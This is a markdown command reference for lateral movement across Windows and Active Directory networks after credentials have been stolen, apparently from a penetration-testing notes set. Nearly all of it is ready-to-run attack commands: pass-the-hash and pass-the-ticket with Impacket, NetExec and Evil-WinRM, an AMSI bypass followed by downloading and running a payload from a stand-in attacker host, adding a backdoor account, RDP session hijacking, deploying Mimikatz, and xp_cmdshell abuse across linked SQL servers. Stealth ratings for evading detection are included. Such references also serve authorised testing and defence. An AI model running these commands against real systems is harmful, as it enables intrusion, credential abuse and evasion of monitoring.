# Lateral Movement Reference

Comprehensive command reference for moving laterally across Windows/AD environments after credential acquisition.

## Credential Type Decision Tree

```text
┌─ Have plaintext password?
│  └─► NetExec (smb/winrm/mssql), Evil-WinRM, Impacket (-p), xfreerdp
│
┌─ Have NTLM hash?
│  └─► NetExec (-H), Evil-WinRM (-H), psexec.py (-hashes), xfreerdp (/pth:)
│
┌─ Have Kerberos ticket (.ccache)?
│  └─► export KRB5CCNAME=/path/to/ticket.ccache
│     └─► Impacket tools (-k -no-pass), NetExec (--use-kcache)
│
┌─ Have certificate/PFX?
│  └─► Evil-WinRM (-c/-k), Certipy auth → TGT → standard flow
│
┌─ Need stealth?
│  └─► wmiexec (fileless), dcomexec (DCOM), WinRM (port 5985/5986)
│
┌─ Need SYSTEM shell?
│  └─► psexec.py (creates service), atexec (scheduled task), Evil-WinRM + SeImpersonate
│
└─ Restricted environment (no 445)?
   └─► WinRM (5985), RDP (3389), MSSQL (1433), DCOM (135+ephemeral)
```

## OPSEC Comparison Matrix

| Tool | Protocol | Disk Writes | Service Creation | Noise (1-5) | Detection Signatures |
|------|----------|-------------|------------------|-------------|---------------------|
| psexec.py | SMB (445) | Yes (temp exe) | Yes (PSEXESVC) | 5 | Service install, named pipe IPC |
| wmiexec.py | WMI (135+) | Minimal (output) | No | 2 | Win32_Process, DCOM activity |
| smbexec.py | SMB (445) | Yes (bat file) | Yes (temp service) | 4 | Service install, cmd.exe spawns |
| atexec.py | SMB+Task (445) | Minimal | No (schtasks) | 3 | Scheduled task creation/deletion |
| dcomexec.py | DCOM (135+) | Minimal | No | 2 | MMC20/ShellWindows COM activity |
| NetExec smb exec | SMB (445) | Yes | Yes | 4 | Similar to psexec |
| NetExec winrm exec | WinRM (5985) | No | No | 2 | PowerShell remoting logs |
| Evil-WinRM | WinRM (5985/5986) | No | No | 2 | PowerShell remoting, HTTP(S) traffic |
| xfreerdp PtH | RDP (3389) | No | No | 3 | RDP logon (event 4624 type 10) |
| PowerShell Remoting | WinRM (5985/5986) | No | No | 2 | PS transcription, module logging |
| WMI direct | WMI (135+) | Minimal | No | 2 | Win32_Process, WMI logs |
| MSSQL xp_cmdshell | MSSQL (1433) | Minimal | No | 3 | SQL logs, xp_cmdshell execution |

**Noise Scale**: 1=minimal, 5=very loud (service creation, disk artifacts, obvious IOCs)

## Port Requirements

- **SMB-based**: 445/tcp (psexec, smbexec, NetExec smb)
- **WMI/DCOM**: 135/tcp + ephemeral high ports (wmiexec, dcomexec, WMI)
- **WinRM**: 5985/tcp (HTTP), 5986/tcp (HTTPS)
- **RDP**: 3389/tcp (xfreerdp, restricted admin)
- **MSSQL**: 1433/tcp (linked servers, xp_cmdshell)
- **Task Scheduler**: 445/tcp (atexec uses SMB for task operations)

---

## Impacket Suite

### psexec.py

**Most reliable, highest noise** — uploads executable, creates service, spawns interactive shell.

```bash
# Password auth
psexec.py $DOMAIN/$USER:$PASS@$TARGET

# Pass-the-Hash
psexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET

# Pass-the-Ticket (Kerberos)
export KRB5CCNAME=/path/to/$TICKET.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET

# Execute single command (no shell)
psexec.py $DOMAIN/$USER:$PASS@$TARGET 'whoami'

# Use specific service name (OpSec)
psexec.py -service-name CustomSvc $DOMAIN/$USER:$PASS@$TARGET
```

### wmiexec.py

**Low noise, fileless** — executes via WMI Win32_Process, output via SMB share or registry.

```bash
# Password auth
wmiexec.py $DOMAIN/$USER:$PASS@$TARGET

# Pass-the-Hash
wmiexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET

# Pass-the-Ticket
export KRB5CCNAME=/path/to/$TICKET.ccache
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET

# Single command with output
wmiexec.py $DOMAIN/$USER:$PASS@$TARGET 'ipconfig /all'

# Non-interactive mode (no shell)
wmiexec.py -nooutput $DOMAIN/$USER:$PASS@$TARGET 'net user attacker P@ssw0rd /add'
```

### smbexec.py

**Semi-fileless** — creates batch file in ADMIN$ share, spawns via service, deletes artifacts.

```bash
# Password auth
smbexec.py $DOMAIN/$USER:$PASS@$TARGET

# Pass-the-Hash
smbexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET

# Pass-the-Ticket
export KRB5CCNAME=/path/to/$TICKET.ccache
smbexec.py -k -no-pass $DOMAIN/$USER@$TARGET

# Custom share (instead of ADMIN$)
smbexec.py -share C$ $DOMAIN/$USER:$PASS@$TARGET
```

### atexec.py

**Scheduled task execution** — runs command via schtasks, good for quick one-off commands.

```bash
# Password auth
atexec.py $DOMAIN/$USER:$PASS@$TARGET 'whoami'

# Pass-the-Hash
atexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET 'ipconfig'

# Pass-the-Ticket
export KRB5CCNAME=/path/to/$TICKET.ccache
atexec.py -k -no-pass $DOMAIN/$USER@$TARGET 'net localgroup administrators'

# Execute as SYSTEM
atexec.py $DOMAIN/$USER:$PASS@$TARGET 'powershell -enc <base64>'
```

### dcomexec.py

**DCOM-based execution** — uses MMC20.Application or ShellWindows COM objects. Very stealthy.

```bash
# Password auth (default MMC20)
dcomexec.py $DOMAIN/$USER:$PASS@$TARGET

# Pass-the-Hash
dcomexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET

# Pass-the-Ticket
export KRB5CCNAME=/path/to/$TICKET.ccache
dcomexec.py -k -no-pass $DOMAIN/$USER@$TARGET

# Specify DCOM object (ShellWindows, ShellBrowserWindow)
dcomexec.py -object ShellWindows $DOMAIN/$USER:$PASS@$TARGET

# Single command execution
dcomexec.py $DOMAIN/$USER:$PASS@$TARGET 'cmd.exe /c whoami > C:\output.txt'
```

---

## NetExec (formerly CrackMapExec)

### SMB Exec

```bash
# Password auth
netexec smb $TARGET -u $USER -p $PASS -x 'whoami'

# Pass-the-Hash
netexec smb $TARGET -u $USER -H $HASH -x 'ipconfig'

# Pass-the-Ticket (requires --use-kcache)
export KRB5CCNAME=/path/to/$TICKET.ccache
netexec smb $TARGET -u $USER --use-kcache -x 'hostname'

# PowerShell command
netexec smb $TARGET -u $USER -p $PASS -X '$PSVersionTable'

# Execute on multiple targets
netexec smb 10.10.10.0/24 -u $USER -p $PASS -x 'whoami' --threads 20

# Use specific share for output
netexec smb $TARGET -u $USER -p $PASS --exec-method smbexec -x 'whoami'
```

### WinRM Exec

```bash
# Password auth
netexec winrm $TARGET -u $USER -p $PASS -x 'whoami'

# Pass-the-Hash (WinRM supports PtH if AllowUnencrypted is enabled)
netexec winrm $TARGET -u $USER -H $HASH -x 'ipconfig'

# PowerShell command (default for WinRM)
netexec winrm $TARGET -u $USER -p $PASS -X 'Get-Process | Select -First 5'

# WinRM over HTTPS (port 5986)
netexec winrm $TARGET -u $USER -p $PASS --port 5986 --ssl -x 'whoami'
```

### MSSQL Exec

```bash
# Password auth
netexec mssql $TARGET -u $USER -p $PASS -x 'whoami'

# Pass-the-Hash
netexec mssql $TARGET -u $USER -H $HASH -x 'ipconfig'

# Query execution (SQL)
netexec mssql $TARGET -u $USER -p $PASS -q 'SELECT @@version'

# Enable xp_cmdshell and execute
netexec mssql $TARGET -u $USER -p $PASS -x 'whoami' --force-xp-cmdshell
```

---

## Evil-WinRM

### Basic Usage

```bash
# Password auth
evil-winrm -i $TARGET -u $USER -p $PASS

# Pass-the-Hash
evil-winrm -i $TARGET -u $USER -H $HASH

# Certificate auth (PFX from AD CS abuse)
evil-winrm -i $TARGET -c /path/to/cert.crt -k /path/to/priv.key -S

# WinRM over HTTPS (port 5986)
evil-winrm -i $TARGET -u $USER -p $PASS -S -P 5986

# Specify realm for Kerberos
evil-winrm -i $TARGET -u $USER -p $PASS -r $DOMAIN
```

### File Operations

```bash
# Inside evil-winrm shell:
*Evil-WinRM* PS> upload /local/path/to/file.exe C:\Windows\Temp\file.exe
*Evil-WinRM* PS> download C:\Users\$USER\Documents\passwords.txt /local/output/
*Evil-WinRM* PS> menu  # show all available commands
```

### Bypass AMSI

```bash
# Inside evil-winrm shell:
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
```

### Load PowerShell Scripts

```bash
# Load script from local file
evil-winrm -i $TARGET -u $USER -p $PASS -s /path/to/scripts/

# Inside shell:
*Evil-WinRM* PS> Invoke-Mimikatz.ps1
*Evil-WinRM* PS> Invoke-Mimikatz
```

---

## xfreerdp (RDP with Pass-the-Hash)

### Restricted Admin Mode

Allows PtH if `DisableRestrictedAdmin` = 0 on target.

```bash
# Pass-the-Hash RDP
xfreerdp /u:$USER /d:$DOMAIN /pth:$HASH /v:$TARGET

# Restricted admin mode (explicit flag)
xfreerdp /u:$USER /d:$DOMAIN /p:$PASS /v:$TARGET /restricted-admin

# Full screen with drive redirection
xfreerdp /u:$USER /d:$DOMAIN /pth:$HASH /v:$TARGET /f /drive:share,/tmp

# Clipboard sharing
xfreerdp /u:$USER /d:$DOMAIN /p:$PASS /v:$TARGET +clipboard

# Ignore certificate warnings
xfreerdap /u:$USER /d:$DOMAIN /pth:$HASH /v:$TARGET /cert-ignore
```

### Session Shadowing

Attach to active RDP session (requires SYSTEM or admin).

```bash
# From within RDP session or psexec SYSTEM shell:
query user  # list active sessions
tscon <SESSION_ID> /dest:console  # hijack session (no password needed)

# Remote shadowing via RDP
mstsc /v:$TARGET /shadow:<SESSION_ID> /control
```

---

## PowerShell Remoting

### Enter-PSSession

```powershell
# Password auth (from Windows)
$cred = Get-Credential
Enter-PSSession -ComputerName $TARGET -Credential $cred

# Use existing Kerberos ticket
Enter-PSSession -ComputerName $TARGET

# WinRM over HTTPS
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck
Enter-PSSession -ComputerName $TARGET -UseSSL -SessionOption $sessionOption -Credential $cred
```

### Invoke-Command

```powershell
# Execute command on remote host
Invoke-Command -ComputerName $TARGET -ScriptBlock { whoami } -Credential $cred

# Execute local script remotely
Invoke-Command -ComputerName $TARGET -FilePath C:\scripts\enum.ps1 -Credential $cred

# Execute on multiple targets
Invoke-Command -ComputerName $TARGET1,$TARGET2,$TARGET3 -ScriptBlock { Get-Process } -Credential $cred

# Pass variables into remote session
Invoke-Command -ComputerName $TARGET -ScriptBlock { param($var) Write-Host $var } -ArgumentList "HelloWorld" -Credential $cred
```

### WinRM Configuration

```powershell
# Enable WinRM (requires local admin)
Enable-PSRemoting -Force

# Allow unencrypted traffic (for PtH from Linux)
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true

# Trust all hosts (client-side)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force
```

---

## PsExec (Sysinternals)

```powershell
# Basic usage (from Windows)
PsExec.exe \\$TARGET -u $DOMAIN\$USER -p $PASS cmd.exe

# Run as SYSTEM
PsExec.exe \\$TARGET -u $DOMAIN\$USER -p $PASS -s cmd.exe

# Accept EULA automatically (first run)
PsExec.exe -accepteula \\$TARGET -u $DOMAIN\$USER -p $PASS cmd.exe

# Copy executable and run
PsExec.exe \\$TARGET -u $DOMAIN\$USER -p $PASS -c C:\tools\mimikatz.exe

# Interactive shell (no /c flag)
PsExec.exe \\$TARGET -u $DOMAIN\$USER -p $PASS -i cmd.exe
```

---

## WMI Direct Execution

### wmic (Windows)

```powershell
# Execute command remotely
wmic /node:$TARGET /user:$DOMAIN\$USER /password:$PASS process call create "cmd.exe /c whoami > C:\output.txt"

# Multiple targets
wmic /node:@targets.txt /user:$DOMAIN\$USER /password:$PASS process call create "cmd.exe /c ipconfig"
```

### PowerShell WMI

```powershell
# Invoke-WmiMethod
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName $TARGET -Credential $cred

# Get-WmiObject (query)
Get-WmiObject -Class Win32_Process -ComputerName $TARGET -Credential $cred | Where-Object { $_.Name -eq "lsass.exe" }

# Create new process
$result = Invoke-WmiMethod -ComputerName $TARGET -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64>" -Credential $cred
```

---

## DCOM Execution

### Manual DCOM (PowerShell)

```powershell
# MMC20.Application
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "$TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\output.txt", "7")

# ShellWindows
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("ShellWindows", "$TARGET"))
$dcom.item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "", $null, 0)

# ShellBrowserWindow
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("ShellBrowserWindow", "$TARGET"))
$dcom.Document.Application.ShellExecute("cmd.exe", "/c whoami", "", $null, 0)
```

### Impacket dcomexec.py

See "Impacket Suite > dcomexec.py" section above.

---

## MSSQL Lateral Movement

### xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin or control server)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc <base64>';

-- Disable after use
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

### Linked Server Execution

```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;

-- Execute query on linked server
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');

-- Enable xp_cmdshell on linked server
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Chain multiple linked servers (A -> B -> C)
SELECT * FROM OPENQUERY([SERVER_B], 'SELECT * FROM OPENQUERY([SERVER_C], ''SELECT @@version'')');
```

### NetExec MSSQL

See "NetExec > MSSQL Exec" section above.

---

## SCShell (Service-Based Lateral)

**Fileless service creation** via remote registry and service control.

```bash
# Install SCShell
git clone https://github.com/Mr-Un1k0d3r/SCShell
cd SCShell

# Execute command
python scshell.py $TARGET $DOMAIN/$USER:$PASS "whoami"

# Pass-the-Hash
python scshell.py $TARGET $DOMAIN/$USER -H $HASH "ipconfig"

# Custom service name
python scshell.py $TARGET $DOMAIN/$USER:$PASS "cmd.exe /c calc.exe" -service-name "CustomSvc"
```

---

## Credential Type Handling Summary

### Plaintext Password

All tools support `-p` or password prompt:
- `psexec.py $DOMAIN/$USER:$PASS@$TARGET`
- `netexec smb $TARGET -u $USER -p $PASS`
- `evil-winrm -i $TARGET -u $USER -p $PASS`
- `xfreerdp /u:$USER /d:$DOMAIN /p:$PASS /v:$TARGET`

### NTLM Hash

Most tools support `-H` or `-hashes` for PtH:
- `psexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET`
- `netexec smb $TARGET -u $USER -H $HASH`
- `evil-winrm -i $TARGET -u $USER -H $HASH`
- `xfreerdp /u:$USER /d:$DOMAIN /pth:$HASH /v:$TARGET`

### Kerberos Ticket

Export `KRB5CCNAME` environment variable, use `-k -no-pass`:
```bash
export KRB5CCNAME=/path/to/$TICKET.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET
netexec smb $TARGET -u $USER --use-kcache
```

### Certificate (PFX/PEM)

Use Evil-WinRM or Certipy:
```bash
# Evil-WinRM with cert/key
evil-winrm -i $TARGET -c cert.crt -k priv.key -S

# Certipy to get TGT, then use ticket
certipy auth -pfx user.pfx -dc-ip $DC_IP
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
```

---

## Common Pitfalls

1. **Kerberos ticket expiry**: Check ticket validity with `klist` before use
2. **Double-hop authentication**: PowerShell remoting can't auth to third host (use CredSSP or tickets)
3. **Firewall rules**: Verify ports (445, 135, 5985) are open with `nmap` before lateral movement
4. **AV/EDR**: wmiexec and dcomexec are quieter than psexec, use them when stealth matters
5. **Restricted Admin RDP**: Requires `DisableRestrictedAdmin=0` in registry for xfreerdp PtH
6. **MSSQL xp_cmdshell context**: Runs as SQL service account, not your authenticated user
7. **Service creation logs**: psexec, smbexec, and SCShell all create Event ID 7045 (service install)
8. **Named pipe permissions**: Some environments restrict `\\pipe\svcctl`, breaking psexec — use WMI fallback

---

## Recommended Workflow

```text
1. Validate credentials first:
   └─► netexec smb $TARGET -u $USER -p $PASS (or -H $HASH)

2. Check available protocols:
   └─► nmap -p 445,135,5985,3389,1433 $TARGET

3. Choose technique based on:
   - Stealth requirement → wmiexec, dcomexec, WinRM
   - Need SYSTEM → psexec, atexec
   - Protocol availability → WinRM if 445 blocked, MSSQL if 1433 open
   - Credential type → tickets require Kerberos, hashes work with PtH-capable tools

4. Execute and capture output:
   └─► wmiexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET 'whoami /all' > output.txt

5. Repeat across target set:
   └─► netexec smb targets.txt -u $USER -H $HASH -x 'whoami' --threads 10
```

---

## Further Reading

- `01-enumeration.md` — gather target list before lateral movement
- `02-credential-access.md` — obtain passwords/hashes/tickets for lateral auth
- Impacket examples: `/usr/share/doc/python3-impacket/examples/`
- NetExec wiki: https://www.netexec.wiki/
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
